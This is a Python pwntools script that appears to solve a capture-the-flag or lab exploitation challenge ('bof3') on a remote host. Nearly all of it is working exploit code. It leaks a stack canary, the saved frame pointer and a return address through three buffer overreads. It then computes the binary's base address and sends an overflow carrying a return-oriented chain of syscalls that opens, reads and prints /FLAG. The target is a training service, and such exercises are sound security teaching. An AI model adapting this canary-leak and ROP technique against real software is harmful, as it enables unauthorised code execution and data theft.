from copy import deepcopy
from typing import Union

from pwn import remote

WORD_BYTES = 8

# in main fuction
OFFSET_RETURN_ADDR_TO_BASE_ADDR = 0x9C83

# current stack in task function
OFFSET_RETURN_ADDR_ENTRY_TO_OLD_RBP = 0x08
OFFSET_RBP_TO_RETURN_ADDR_ENTRY = 0x08

OFFSET_CANARY_TO_RBP = 0x08
OFFSET_BUF1_TO_RBP = 0xC0
OFFSET_BUF2_TO_RBP = OFFSET_BUF1_TO_RBP - 0x30
OFFSET_BUF3_TO_RBP = OFFSET_BUF2_TO_RBP - 0x30
OFFSET_MSG_TO_RBP = OFFSET_BUF3_TO_RBP - 0x30


def to_bytes(source: Union[int, bytes]) -> bytes:
    if isinstance(source, int):
        source = source.to_bytes(WORD_BYTES, byteorder="little")
    else:
        num_paddings = (WORD_BYTES - (len(source) % WORD_BYTES)) % WORD_BYTES
        source = source + b"\x00" * num_paddings
    return source


def to_bytecodes(base_addr: int, codes: list[Union[int, bytes]]):
    bytecodes = bytearray()
    for code in codes:
        if isinstance(code, int):
            code += base_addr
        code = to_bytes(code)
        # trunk-ignore(bandit/B101)
        assert isinstance(code, bytes)
        bytecodes.extend(code)
    return bytecodes


FLAG_PATH = to_bytes(b"/FLAG")
FLAG_CONTENT = to_bytes(b"\x00" * 64)
NONE_BYTECODES = b"\xff" * WORD_BYTES

OPEN_CODE = [
    # pop rdi; ret
    0xBC33,
    # flag path
    NONE_BYTECODES,
    # pop rsi; ret
    0xA7A8,
    # O_RDONLY
    b"\x00",
    # pop rax; ret
    0x66287,
    # open syscall id
    b"\x02",
    # syscall; ret
    0x30BA6,
]

READ_CODE = [
    # pop rdi; ret
    0xBC33,
    # flag fd, assume fd is 3
    b"\x03",
    # pop rsi; ret
    0xA7A8,
    # flag content
    NONE_BYTECODES,
    # pop rdx; ret
    0x15F6E,
    # original length of flag content
    to_bytes(len(FLAG_CONTENT)),
    # pop rax; ret
    0x66287,
    # read syscall id
    b"\x00",
    # syscall; ret
    0x30BA6,
]

WRITE_CODE = [
    # pop rdi; ret
    0xBC33,
    # STDOUT
    b"\x01",
    # pop rsi; ret
    0xA7A8,
    # flag content
    NONE_BYTECODES,
    # pop rdx; ret
    0x15F6E,
    # actual length of flag content
    to_bytes(len(FLAG_CONTENT)),
    # pop rax; ret
    0x66287,
    # write syscall id
    b"\x01",
    # syscall; ret
    0x30BA6,
]

EXIT_CODE = [
    # pop rdi; ret
    0xBC33,
    # return status
    b"\x00",
    # pop rax; ret
    0x66287,
    # exit syscall id
    b"\x3c",
    # syscall; ret
    0x30BA6,
]

SHELL_CODE = [
    *OPEN_CODE,
    *READ_CODE,
    *WRITE_CODE,
    *EXIT_CODE,
    FLAG_PATH,
    FLAG_CONTENT,
]


def fill_nones(bytecodes: bytearray, map: list[Union[int, bytes]]):
    # trunk-ignore(bandit/B101)
    assert isinstance(bytecodes, bytearray) and len(bytecodes) % WORD_BYTES == 0

    # check for every words
    num_nones = 0
    new_bytecodes = deepcopy(bytecodes)
    for i in range(0, len(new_bytecodes), WORD_BYTES):
        word = new_bytecodes[i : i + WORD_BYTES]
        if bytes(word) == NONE_BYTECODES:
            new_bytecodes[i : i + WORD_BYTES] = to_bytes(map[num_nones])
            num_nones += 1
    return new_bytecodes


def solve(r: remote):
    r.recvuntil(b"What's your name? ")

    # 1. leak the canary value
    # NOTE: the first byte of canary values is always 0x0
    # NOTE: If the later bytes have 0x0, it is still failed. But the number of inputs is only 3, we cannot solve it.
    msg = b"A" * (OFFSET_BUF1_TO_RBP - OFFSET_CANARY_TO_RBP)
    r.sendline(msg)
    canary_bytes = b"\x00" + r.recvlinesb(2)[1][: (WORD_BYTES - 1)]
    canary_val = int.from_bytes(canary_bytes, byteorder="little")
    print(f"canary value: 0x{canary_val:x}")

    r.recvuntil(b"What's the room number? ")

    # 2. leak the old rbp value
    msg = b"A" * (OFFSET_BUF2_TO_RBP - 1)
    r.sendline(msg)
    old_rbp_val = int.from_bytes(r.recvlinesb(2)[1][:WORD_BYTES], byteorder="little")
    print(f"old rbp value: 0x{old_rbp_val:x}")

    r.recvuntil(b"What's the customer's name? ")

    # 3. leak the return address
    msg = b"A" * (OFFSET_BUF3_TO_RBP + OFFSET_RBP_TO_RETURN_ADDR_ENTRY - 1)
    r.sendline(msg)
    ret_addr = int.from_bytes(r.recvlinesb(2)[1][:WORD_BYTES], byteorder="little")
    print(f"original return address: 0x{ret_addr:x}")

    r.recvuntil(b"Leave your message: ")

    # 4. restore the canary value, replace the rbp with the last byte in bytecode, replace the stack with the bytecode
    base_addr = ret_addr - OFFSET_RETURN_ADDR_TO_BASE_ADDR
    print(f"base address: 0x{base_addr:x}")
    ret_addr_entry = old_rbp_val - OFFSET_RETURN_ADDR_ENTRY_TO_OLD_RBP
    print(f"return address entry address: 0x{ret_addr_entry:x}")

    # convert shellcode to bytecode
    bytecodes = to_bytecodes(base_addr, SHELL_CODE)
    rbp_val = ret_addr_entry + len(bytecodes)
    flag_content_entry = rbp_val - len(FLAG_CONTENT)
    flag_path_entry = flag_content_entry - len(FLAG_PATH)
    bytecodes = fill_nones(
        bytecodes, [flag_path_entry, flag_content_entry, flag_content_entry]
    )

    print(f"length of bytecodes: {len(bytecodes)}")

    msg = (
        b"A" * (OFFSET_MSG_TO_RBP - OFFSET_CANARY_TO_RBP)
        + canary_bytes
        + to_bytes(rbp_val)
        + bytecodes
    )
    print(f"length of message: {len(msg)}")
    r.sendline(msg)
    r.recvlines(2)

    msg = r.recvuntil(b"}").decode()
    print(msg)

    r.close()


if __name__ == "__main__":
    ## for remote access
    exe = "./samples/bof3"
    # r = process(exe, shell=False)
    r = remote("up.zoolab.org", 12344)
    solve(r)
